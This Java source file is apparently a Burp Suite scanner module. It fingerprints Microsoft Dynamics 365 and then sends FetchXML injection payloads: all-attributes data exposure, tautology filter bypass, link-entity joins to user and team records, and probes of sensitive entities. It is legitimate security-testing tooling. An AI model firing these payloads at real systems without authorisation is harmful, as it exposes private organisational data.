package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.*;
import com.omnistrike.model.*;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Pattern;

/**
 * MODULE: Dynamics 365 FetchXML Injection Scanner
 *
 * This module CANNOT be manually triggered by the user. It is an active module
 * that passively gates on Dynamics 365 error indicators in responses. Only when
 * D365 is confirmed does it fire FetchXML injection payloads.
 *
 * Flow:
 *   1. Receives request/response via processHttpFlow() during active scanning
 *   2. Checks the RESPONSE body for Dynamics 365 error indicators
 *   3. If NO D365 indicators → returns empty (zero payloads sent)
 *   4. If D365 detected → reports INFO finding, then injects FetchXML payloads
 *   5. Preserves original encoding (base64, URL-encoded, or raw)
 *
 * Stop-scan: Respects ScanState.isCancelled() and Thread.isInterrupted().
 */
public class Dynamics365Scanner implements ScanModule {

    private static final String MODULE_ID = "dynamics365-scanner";

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;

    // ── D365 detection patterns (passive gate) ──────────────────────────────

    // Error messages that confirm Dynamics 365 / Dataverse / Power Platform
    private static final Pattern D365_ERROR_PATTERN = Pattern.compile(
            "Microsoft\\.Xrm\\.Sdk|Microsoft\\.Crm|"
                    + "System\\.ServiceModel\\.FaultException.*Crm|"
                    + "Entity does not contain attribute|"
                    + "The given key was not present in the dictionary.*(?:Xrm|CrmSdk|Dataverse|attribute)|"
                    + "(?:OrganizationServiceFault|CrmException|Microsoft\\.Xrm).*(?:0x80040216|0x80040217|0x80040220|0x80048408|0x80040203)|"  // D365 error codes — require CRM context (shared with DirectShow/CDO otherwise)
                    + "OrganizationServiceFault|"
                    + "fetchXml.*is not valid|"
                    + "Invalid FetchXML|"
                    + "Crm\\.CrmException|"
                    + "Microsoft\\.Dynamics\\.CRM\\.\\w+Exception|"  // CRM-specific, excludes NAV/GP/AX/F&O
                    + "The condition.*is not valid for attribute|"
                    + "The entity.*doesn't contain.*attribute|"
                    + "attribute.*does not exist on entity|"
                    + "CrmHttpResponseException|"
                    + "SecLib::AccessCheckEx|"
                    + "Principal user.*lacks.*privilege|"
                    + "0x80040265",
            Pattern.CASE_INSENSITIVE);

    // URL patterns that strongly indicate D365/Dataverse endpoints
    private static final Pattern D365_URL_PATTERN = Pattern.compile(
            "/api/data/v[89]\\.[0-9]+/|"
                    + "\\.dynamics\\.com/|"
                    + "\\.crm\\d*\\.dynamics\\.com|"
                    + "RetrieveMultiple|"
                    + "fetchXml=",
            Pattern.CASE_INSENSITIVE);

    // Response headers indicating D365 — only truly D365-specific headers
    // Excluded: odata-version, preference-applied (generic OData), req_id (generic), ms-cv (all Azure),
    //           x-ms-service-request-id (generic Azure request tracking, not D365-specific)
    private static final Set<String> D365_HEADERS = Set.of(
            "x-ms-dynamics-organization", "x-ms-dyn-organization",
            "x-ms-dynamics-request-uri");

    // ── FetchXML injection payloads ─────────────────────────────────────────

    // Phase 1: Data exposure — inject <all-attributes/> to extract all columns
    private static final String[] PHASE1_DATA_EXPOSURE = {
            // Inject all-attributes to leak extra columns
            "<fetch top='1'><entity name='ENTITY'><all-attributes/></entity></fetch>",
            // Inject all-attributes with distinct
            "<fetch distinct='true' top='5'><entity name='ENTITY'><all-attributes/></entity></fetch>",
    };

    // Phase 2: Filter bypass — inject tautology conditions
    private static final String[][] PHASE2_FILTER_BYPASS = {
            {"<condition attribute='statecode' operator='ge' value='0'/>", "statecode tautology"},
            {"<condition attribute='createdon' operator='not-null'/>", "createdon not-null tautology"},
            {"<condition attribute='modifiedon' operator='not-null'/>", "modifiedon not-null tautology"},
    };

    // Phase 3: Cross-entity join — link-entity to access related data
    private static final String[][] PHASE3_CROSS_ENTITY = {
            {"<link-entity name='systemuser' from='systemuserid' to='ownerid' alias='owner'><all-attributes/></link-entity>",
                    "link-entity systemuser join"},
            {"<link-entity name='team' from='teamid' to='owningteam' alias='team'><all-attributes/></link-entity>",
                    "link-entity team join"},
    };

    // Phase 4: Entity enumeration — probe common sensitive entities
    private static final String[] SENSITIVE_ENTITIES = {
            "systemuser", "team", "role", "privilege", "audit",
            "email", "phonecall", "annotation", "connection",
            "workflow", "plugintype", "sdkmessageprocessingstep"
    };

    // ── Encoding detection ──────────────────────────────────────────────────

    private static final Pattern BASE64_PATTERN = Pattern.compile(
            "^[A-Za-z0-9+/]{20,}={0,2}$");

    // FetchXML parameter name hints
    private static final Set<String> FETCHXML_PARAM_NAMES = Set.of(
            "fetchxml", "fetchxmlquery", "query", "savedquery", "userquery",
            "xml", "fetch", "filter", "odata", "$filter");

    // ── ScanModule interface ────────────────────────────────────────────────

    @Override public String getId() { return MODULE_ID; }
    @Override public String getName() { return "Dynamics 365 FetchXML Injection"; }
    @Override public String getDescription() {
        return "Detects Microsoft Dynamics 365 and tests for FetchXML injection. "
                + "Only activates when D365 error indicators are detected in responses.";
    }
    @Override public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }
    @Override public boolean isPassive() { return false; } // Active module with passive gate

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        // collaboratorManager not used — no OOB needed for FetchXML
    }

    @Override public void destroy() {}

    // ── Main entry point ────────────────────────────────────────────────────

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        if (requestResponse.response() == null) return Collections.emptyList();

        String url = requestResponse.request().url();
        String urlPath = extractPath(url);

        // PASSIVE GATE: Check response for D365 indicators
        D365Detection detection = detectDynamics365(requestResponse);
        if (detection == null) return Collections.emptyList();

        // D365 confirmed — report INFO finding
        if (dedup.markIfNew(MODULE_ID, urlPath, "d365-detected")) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "Microsoft Dynamics 365 Detected",
                            Severity.INFO, Confidence.CERTAIN)
                    .url(url)
                    .evidence(detection.evidence)
                    .description("The target application is running Microsoft Dynamics 365 / Dataverse. "
                            + "FetchXML injection testing will be performed automatically.")
                    .requestResponse(requestResponse)
                    .build());
            api.logging().logToOutput("[D365] Dynamics 365 detected: " + url + " | " + detection.evidence);
        }

        // ACTIVE ATTACK: Inject FetchXML payloads
        try {
            testFetchXmlInjection(requestResponse, detection, url, urlPath);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        return Collections.emptyList();
    }

    // ── D365 Detection (passive gate) ───────────────────────────────────────

    private D365Detection detectDynamics365(HttpRequestResponse reqResp) {
        String body = reqResp.response().bodyToString();
        if (body == null) body = "";
        String url = reqResp.request().url();

        // Check 1: Error messages in response body (strongest signal)
        if (D365_ERROR_PATTERN.matcher(body).find()) {
            return new D365Detection("D365 error pattern in response body",
                    extractEntityFromError(body));
        }

        // Check 2: URL pattern
        if (D365_URL_PATTERN.matcher(url).find()) {
            // URL alone is weaker — require a second signal
            // Check for D365 response headers as corroboration
            for (var h : reqResp.response().headers()) {
                if (D365_HEADERS.contains(h.name().toLowerCase())) {
                    return new D365Detection(
                            "D365 URL pattern (" + url + ") + header: " + h.name(),
                            extractEntityFromUrl(url));
                }
            }
            // URL + OData content-type
            for (var h : reqResp.response().headers()) {
                if (h.name().equalsIgnoreCase("Content-Type")
                        && h.value().toLowerCase().contains("odata")) {
                    return new D365Detection(
                            "D365 URL pattern + OData Content-Type",
                            extractEntityFromUrl(url));
                }
            }
        }

        return null; // No D365 detected — module stays dormant
    }

    // ── Active FetchXML Injection Testing ───────────────────────────────────

    private void testFetchXmlInjection(HttpRequestResponse original, D365Detection detection,
                                        String url, String urlPath) throws InterruptedException {
        HttpRequest request = original.request();

        // Find the injectable parameter(s) — prioritize FetchXML-like parameters
        List<InjectableParam> targets = identifyTargets(request);
        if (targets.isEmpty()) return;

        for (InjectableParam target : targets) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            if (!dedup.markIfNew(MODULE_ID, urlPath, target.name)) continue;

            api.logging().logToOutput("[D365] Testing parameter '" + target.name
                    + "' (encoding: " + target.encoding + ") on " + url);

            // Phase 1: Data exposure via <all-attributes/>
            testDataExposure(original, target, detection.entityName, url);

            // Phase 2: Filter bypass
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testFilterBypass(original, target, url);

            // Phase 3: Cross-entity join
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testCrossEntityJoin(original, target, detection.entityName, url);

            // Phase 4: Entity enumeration
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testEntityEnumeration(original, target, url);
        }
    }

    // ── Phase 1: Data Exposure ──────────────────────────────────────────────

    private void testDataExposure(HttpRequestResponse original, InjectableParam target,
                                   String entityName, String url) throws InterruptedException {
        if (entityName == null || entityName.isEmpty()) entityName = "account"; // fallback

        // Baseline: original response
        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";
        int baselineLen = baselineBody.length();

        for (String template : PHASE1_DATA_EXPOSURE) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

            String payload = template.replace("ENTITY", entityName);
            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) { perHostDelay(); continue; }
            if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) { perHostDelay(); continue; }
            if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }

            String resultBody = result.response().bodyToString();
            if (resultBody == null) resultBody = "";

            // Check: response significantly larger (new columns returned)
            if (resultBody.length() > baselineLen + 200
                    && result.response().statusCode() == 200
                    && !resultBody.equals(baselineBody)) {

                // Verify new fields actually appeared
                int newFieldCount = countNewJsonKeys(baselineBody, resultBody);
                if (newFieldCount >= 2) {
                    findingsStore.addFinding(Finding.builder(MODULE_ID,
                                    "D365 FetchXML Data Exposure — " + newFieldCount + " extra columns",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url).parameter(target.name)
                            .evidence("Injected <all-attributes/> returned " + newFieldCount
                                    + " additional data fields not in baseline response. "
                                    + "Response grew by " + (resultBody.length() - baselineLen) + " bytes.")
                            .payload(payload)
                            .requestResponse(result)
                            .build());
                    return; // One confirmed finding per phase
                }
            }
            perHostDelay();
        }
    }

    // ── Phase 2: Filter Bypass ──────────────────────────────────────────────

    private void testFilterBypass(HttpRequestResponse original, InjectableParam target,
                                   String url) throws InterruptedException {
        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";
        int baselineLen = baselineBody.length();

        for (String[] entry : PHASE2_FILTER_BYPASS) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

            String filterPayload = entry[0];
            String technique = entry[1];

            // Inject the tautology filter into the original FetchXML value
            String injected = injectFilterIntoValue(target.decodedValue, filterPayload);
            if (injected == null) continue;

            HttpRequestResponse result = sendPayload(original, target, injected);
            if (result == null || result.response() == null) { perHostDelay(); continue; }
            if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) { perHostDelay(); continue; }
            if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }

            String resultBody = result.response().bodyToString();
            if (resultBody == null) resultBody = "";

            // Check: more rows returned (filter was bypassed)
            int baselineRows = countOccurrences(baselineBody, "\"@odata.etag\"");
            int resultRows = countOccurrences(resultBody, "\"@odata.etag\"");

            if (resultRows > baselineRows && resultRows >= baselineRows + 2
                    && result.response().statusCode() == 200) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "D365 FetchXML Filter Bypass — " + technique,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Injected tautology filter returned " + resultRows
                                + " rows vs baseline " + baselineRows + " rows. "
                                + "Filter condition was bypassed.")
                        .payload(injected)
                        .requestResponse(result)
                        .build());
                return;
            }
            perHostDelay();
        }
    }

    // ── Phase 3: Cross-Entity Join ──────────────────────────────────────────

    private void testCrossEntityJoin(HttpRequestResponse original, InjectableParam target,
                                      String entityName, String url) throws InterruptedException {
        if (entityName == null || entityName.isEmpty()) return;

        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";

        for (String[] entry : PHASE3_CROSS_ENTITY) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

            String linkEntity = entry[0];
            String technique = entry[1];

            String injected = injectLinkEntityIntoValue(target.decodedValue, linkEntity);
            if (injected == null) continue;

            HttpRequestResponse result = sendPayload(original, target, injected);
            if (result == null || result.response() == null) { perHostDelay(); continue; }
            if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) { perHostDelay(); continue; }
            if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }

            String resultBody = result.response().bodyToString();
            if (resultBody == null) resultBody = "";

            // Check: cross-entity data appeared (owner.*, team.* aliases)
            String alias = linkEntity.contains("alias='") ?
                    linkEntity.split("alias='")[1].split("'")[0] : "linked";

            if (resultBody.contains("\"" + alias + ".")
                    && !baselineBody.contains("\"" + alias + ".")
                    && result.response().statusCode() == 200) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "D365 FetchXML Cross-Entity Data Access — " + technique,
                                Severity.CRITICAL, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Injected link-entity join returned data from related entity. "
                                + "Alias '" + alias + "' fields appeared in response but not in baseline.")
                        .payload(injected)
                        .requestResponse(result)
                        .build());
                return;
            }
            perHostDelay();
        }
    }

    // ── Phase 4: Entity Enumeration ─────────────────────────────────────────

    private void testEntityEnumeration(HttpRequestResponse original, InjectableParam target,
                                        String url) throws InterruptedException {
        // First, establish that the parameter actually influences the response.
        // Send two different entity probes and check they produce different responses.
        // If both return identical responses, the parameter is not injectable — bail out.
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        String probeA = "<fetch top='1'><entity name='systemuser'><all-attributes/></entity></fetch>";
        String probeB = "<fetch top='1'><entity name='annotation'><all-attributes/></entity></fetch>";
        HttpRequestResponse resultA = sendPayload(original, target, probeA);
        perHostDelay();
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        HttpRequestResponse resultB = sendPayload(original, target, probeB);
        perHostDelay();

        if (resultA == null || resultA.response() == null || resultB == null || resultB.response() == null) return;
        String bodyA = resultA.response().bodyToString();
        String bodyB = resultB.response().bodyToString();
        if (bodyA == null) bodyA = "";
        if (bodyB == null) bodyB = "";

        // If both probes produce identical responses, the param is not injectable
        if (bodyA.equals(bodyB)) {
            api.logging().logToOutput("[D365] Entity enumeration: differential probe failed — param '"
                    + target.name + "' does not influence response. Skipping.");
            return;
        }

        for (String entity : SENSITIVE_ENTITIES) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

            String probe = "<fetch top='1'><entity name='" + entity + "'><all-attributes/></entity></fetch>";
            HttpRequestResponse result = sendPayload(original, target, probe);
            if (result == null || result.response() == null) { perHostDelay(); continue; }

            int status = result.response().statusCode();
            if (status >= 400 && status < 500) { perHostDelay(); continue; }
            if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            if (body == null) body = "";

            // Require OData marker AND "value" AND entity-specific field
            boolean hasODataMarker = body.contains("@odata");
            boolean hasValueArray = body.contains("\"value\"");
            if (status == 200 && body.length() > 50
                    && hasODataMarker && hasValueArray
                    && !body.toLowerCase().contains("does not exist")
                    && !body.toLowerCase().contains("entity does not contain")
                    && !body.toLowerCase().contains("not found")) {

                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "D365 Sensitive Entity Accessible — " + entity,
                                Severity.MEDIUM, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("FetchXML query against entity '" + entity + "' returned data. "
                                + "Differential probe confirmed parameter influences query results. "
                                + "Response length: " + body.length() + " bytes.")
                        .payload(probe)
                        .requestResponse(result)
                        .build());
            }
            perHostDelay();
        }
    }

    // ── Target Identification ───────────────────────────────────────────────

    private List<InjectableParam> identifyTargets(HttpRequest request) {
        List<InjectableParam> targets = new ArrayList<>();

        for (var param : request.parameters()) {
            String name = param.name().toLowerCase();
            String value = param.value();
            if (value == null || value.isEmpty()) continue;

            // Detect encoding
            Encoding encoding = detectEncoding(value);
            String decoded = decode(value, encoding);

            // Priority 1: Parameter contains FetchXML content
            if (decoded != null && (decoded.contains("<fetch") || decoded.contains("<filter")
                    || decoded.contains("<entity") || decoded.contains("<condition"))) {
                targets.add(0, new InjectableParam(param.name(), value, decoded,
                        param.type(), encoding, true));
                continue;
            }

            // Priority 2: Parameter name suggests FetchXML
            if (FETCHXML_PARAM_NAMES.contains(name)) {
                targets.add(new InjectableParam(param.name(), value, decoded,
                        param.type(), encoding, false));
            }
        }

        // If no specific targets found, don't test random parameters
        // D365 injection only makes sense on FetchXML-carrying parameters
        return targets;
    }

    // ── Encoding Detection & Preservation ────────────────────────────────────

    private enum Encoding { RAW, BASE64, URL_ENCODED, DOUBLE_URL_ENCODED }

    private Encoding detectEncoding(String value) {
        if (value == null) return Encoding.RAW;

        // Double URL-encoded: contains %25xx
        if (value.contains("%253C") || value.contains("%2526")) {
            return Encoding.DOUBLE_URL_ENCODED;
        }

        // URL-encoded: contains %3C (%xx patterns)
        if (value.contains("%3C") || value.contains("%3c") || value.contains("%26")
                || value.contains("%3E") || value.contains("%3e")) {
            return Encoding.URL_ENCODED;
        }

        // Base64: matches base64 pattern and decodes to readable content
        String trimmed = value.trim();
        if (BASE64_PATTERN.matcher(trimmed).find()) {
            try {
                byte[] decoded = Base64.getDecoder().decode(trimmed);
                String text = new String(decoded, StandardCharsets.UTF_8);
                // Must decode to something with XML/text indicators
                if (text.contains("<") || text.contains("fetch") || text.contains("entity")) {
                    return Encoding.BASE64;
                }
            } catch (Exception ignored) {}
        }

        return Encoding.RAW;
    }

    private String decode(String value, Encoding encoding) {
        if (value == null) return null;
        try {
            switch (encoding) {
                case BASE64:
                    return new String(Base64.getDecoder().decode(value.trim()), StandardCharsets.UTF_8);
                case URL_ENCODED:
                    return java.net.URLDecoder.decode(value, StandardCharsets.UTF_8);
                case DOUBLE_URL_ENCODED:
                    String single = java.net.URLDecoder.decode(value, StandardCharsets.UTF_8);
                    return java.net.URLDecoder.decode(single, StandardCharsets.UTF_8);
                default:
                    return value;
            }
        } catch (Exception e) {
            return value;
        }
    }

    private String encode(String payload, Encoding encoding) {
        if (payload == null) return null;
        try {
            switch (encoding) {
                case BASE64:
                    return Base64.getEncoder().encodeToString(payload.getBytes(StandardCharsets.UTF_8));
                case URL_ENCODED:
                    // Montoya's withUpdatedParameters() handles URL encoding internally,
                    // so return the raw payload to avoid double-encoding.
                    return payload;
                case DOUBLE_URL_ENCODED:
                    // Montoya adds one layer of URL encoding, so we encode once here
                    // and let Montoya apply the second layer.
                    return java.net.URLEncoder.encode(payload, StandardCharsets.UTF_8);
                default:
                    return payload;
            }
        } catch (Exception e) {
            return payload;
        }
    }

    // ── HTTP Request Sending ────────────────────────────────────────────────

    private HttpRequestResponse sendPayload(HttpRequestResponse original, InjectableParam target,
                                             String fetchXmlPayload) {
        if (ScanState.isCancelled()) return null;

        // Encode the payload to match the original parameter's encoding
        String encoded = encode(fetchXmlPayload, target.encoding);

        try {
            HttpRequest modified;
            switch (target.paramType) {
                case URL:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.urlParameter(target.name, encoded));
                    break;
                case BODY:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.bodyParameter(target.name, encoded));
                    break;
                default:
                    return null;
            }

            HttpRequestResponse result = api.http().sendRequest(modified);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    // ── FetchXML Manipulation Helpers ────────────────────────────────────────

    /** Inject a filter condition into an existing FetchXML value */
    private String injectFilterIntoValue(String decodedValue, String filterCondition) {
        if (decodedValue == null) return null;
        // Find </entity> and inject filter before it
        int entityClose = decodedValue.indexOf("</entity>");

        // Handle self-closing entity tag: <entity ... /> → convert to <entity ...>INJECTION</entity>
        if (entityClose < 0) {
            String expanded = expandSelfClosingEntity(decodedValue);
            if (expanded == null) return null;
            entityClose = expanded.indexOf("</entity>");
            if (entityClose < 0) return null;
            decodedValue = expanded;
        }

        // Find existing <filter> or inject new one
        int filterIdx = decodedValue.indexOf("<filter");
        if (filterIdx >= 0 && filterIdx < entityClose) {
            // Inject condition into existing filter
            int filterClose = decodedValue.indexOf("</filter>", filterIdx);
            if (filterClose >= 0) {
                return decodedValue.substring(0, filterClose) + filterCondition
                        + decodedValue.substring(filterClose);
            }
        }
        // No existing filter — add one before </entity>
        return decodedValue.substring(0, entityClose)
                + "<filter>" + filterCondition + "</filter>"
                + decodedValue.substring(entityClose);
    }

    /** Inject a link-entity into an existing FetchXML value */
    private String injectLinkEntityIntoValue(String decodedValue, String linkEntity) {
        if (decodedValue == null) return null;
        int entityClose = decodedValue.indexOf("</entity>");

        // Handle self-closing entity tag: <entity ... /> → convert to <entity ...>INJECTION</entity>
        if (entityClose < 0) {
            String expanded = expandSelfClosingEntity(decodedValue);
            if (expanded == null) return null;
            entityClose = expanded.indexOf("</entity>");
            if (entityClose < 0) return null;
            decodedValue = expanded;
        }

        return decodedValue.substring(0, entityClose) + linkEntity + decodedValue.substring(entityClose);
    }

    /**
     * Expands a self-closing entity tag (e.g., {@code <entity name='account'/>})
     * into an open/close pair ({@code <entity name='account'></entity>}).
     * Returns null if no self-closing entity tag is found.
     */
    private String expandSelfClosingEntity(String xml) {
        java.util.regex.Matcher m = Pattern.compile("<entity\\b([^>]*)/\\s*>").matcher(xml);
        if (m.find()) {
            String attrs = m.group(1);
            return xml.substring(0, m.start())
                    + "<entity" + attrs + "></entity>"
                    + xml.substring(m.end());
        }
        return null;
    }

    // ── Entity Name Extraction ──────────────────────────────────────────────

    private String extractEntityFromError(String body) {
        // Try to find entity name from D365 error messages
        Pattern entityPattern = Pattern.compile(
                "entity '(\\w+)'|entity name=\"(\\w+)\"|Entity: (\\w+)|"
                        + "attribute.*entity '(\\w+)'",
                Pattern.CASE_INSENSITIVE);
        var matcher = entityPattern.matcher(body);
        if (matcher.find()) {
            for (int i = 1; i <= matcher.groupCount(); i++) {
                if (matcher.group(i) != null) return matcher.group(i);
            }
        }
        return null;
    }

    private String extractEntityFromUrl(String url) {
        // Extract entity name from OData URL like /api/data/v9.2/accounts
        Pattern pattern = Pattern.compile("/api/data/v[89]\\.[0-9]+/(\\w+)", Pattern.CASE_INSENSITIVE);
        var matcher = pattern.matcher(url);
        if (matcher.find()) {
            String plural = matcher.group(1);
            // D365 uses plural names in URL, singular in FetchXML
            if (plural.endsWith("ies")) return plural.substring(0, plural.length() - 3) + "y";
            if (plural.endsWith("ses")) return plural.substring(0, plural.length() - 2);
            if (plural.endsWith("s")) return plural.substring(0, plural.length() - 1);
            return plural;
        }
        return null;
    }

    // ── Utility Methods ─────────────────────────────────────────────────────

    private int countNewJsonKeys(String baseline, String result) {
        // Count JSON keys in result that don't appear in baseline
        Pattern keyPattern = Pattern.compile("\"(\\w+)\"\\s*:");
        Set<String> baselineKeys = new HashSet<>();
        var bm = keyPattern.matcher(baseline);
        while (bm.find()) baselineKeys.add(bm.group(1));

        Set<String> newKeys = new HashSet<>();
        var rm = keyPattern.matcher(result);
        while (rm.find()) {
            if (!baselineKeys.contains(rm.group(1))) newKeys.add(rm.group(1));
        }
        return newKeys.size();
    }

    private int countOccurrences(String text, String search) {
        int count = 0, idx = 0;
        while ((idx = text.indexOf(search, idx)) >= 0) { count++; idx += search.length(); }
        return count;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("d365.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    private String extractPath(String url) {
        try {
            int s = url.indexOf("://");
            if (s >= 0) { int q = url.indexOf('?', s + 3); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    // ── Inner classes ───────────────────────────────────────────────────────

    private static class D365Detection {
        final String evidence;
        final String entityName;
        D365Detection(String evidence, String entityName) {
            this.evidence = evidence;
            this.entityName = entityName;
        }
    }

    private static class InjectableParam {
        final String name;
        final String originalValue;
        final String decodedValue;
        final HttpParameterType paramType;
        final Encoding encoding;
        final boolean isFetchXml; // true if the value actually contains FetchXML

        InjectableParam(String name, String originalValue, String decodedValue,
                         HttpParameterType paramType, Encoding encoding, boolean isFetchXml) {
            this.name = name;
            this.originalValue = originalValue;
            this.decodedValue = decodedValue;
            this.paramType = paramType;
            this.encoding = encoding;
            this.isFetchXml = isFetchXml;
        }
    }
}
